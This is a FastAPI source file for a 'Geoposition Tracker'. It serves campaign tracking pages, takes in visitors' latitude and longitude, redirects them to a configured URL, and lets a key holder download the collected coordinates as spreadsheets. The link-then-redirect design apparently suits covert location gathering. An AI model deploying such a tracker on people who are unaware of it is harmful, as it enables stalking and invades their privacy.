import hmac

from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel

from app.config import API_KEY, DATA_DIR, load_campaigns
from app.storage import save_location

app = FastAPI(title="Geoposition Tracker")
templates = Jinja2Templates(directory="app/templates")


class LocationPayload(BaseModel):
    campaign_id: str
    latitude: float
    longitude: float


@app.get("/track/{campaign_id}", response_class=HTMLResponse)
async def track_page(request: Request, campaign_id: str):
    campaigns = load_campaigns()
    if campaign_id not in campaigns:
        raise HTTPException(status_code=404, detail="Campaign not found")

    redirect_url = campaigns[campaign_id]["redirect_url"]
    return templates.TemplateResponse(
        "locate.html",
        {
            "request": request,
            "campaign_id": campaign_id,
            "redirect_url": redirect_url,
        },
    )


@app.post("/api/location")
async def receive_location(payload: LocationPayload):
    campaigns = load_campaigns()
    if payload.campaign_id not in campaigns:
        raise HTTPException(status_code=404, detail="Campaign not found")

    save_location(payload.campaign_id, payload.latitude, payload.longitude)
    redirect_url = campaigns[payload.campaign_id]["redirect_url"]
    return {"status": "ok", "redirect_url": redirect_url}


def _verify_api_key(x_api_key: str | None) -> None:
    if not x_api_key or not hmac.compare_digest(x_api_key, API_KEY):
        raise HTTPException(status_code=401, detail="Invalid API key")


@app.get("/api/campaigns")
async def list_campaigns(x_api_key: str | None = Header(default=None)):
    _verify_api_key(x_api_key)
    campaigns = load_campaigns()
    return {
        cid: {"label": c.get("label", cid), "has_data": (DATA_DIR / f"{cid}.xlsx").exists()}
        for cid, c in campaigns.items()
    }


@app.get("/api/download/{campaign_id}")
async def download_xlsx(campaign_id: str, x_api_key: str | None = Header(default=None)):
    _verify_api_key(x_api_key)
    campaigns = load_campaigns()
    if campaign_id not in campaigns:
        raise HTTPException(status_code=404, detail="Campaign not found")

    path = DATA_DIR / f"{campaign_id}.xlsx"
    if not path.exists():
        raise HTTPException(status_code=404, detail="No data collected yet")

    return FileResponse(
        path,
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        filename=f"{campaign_id}.xlsx",
    )
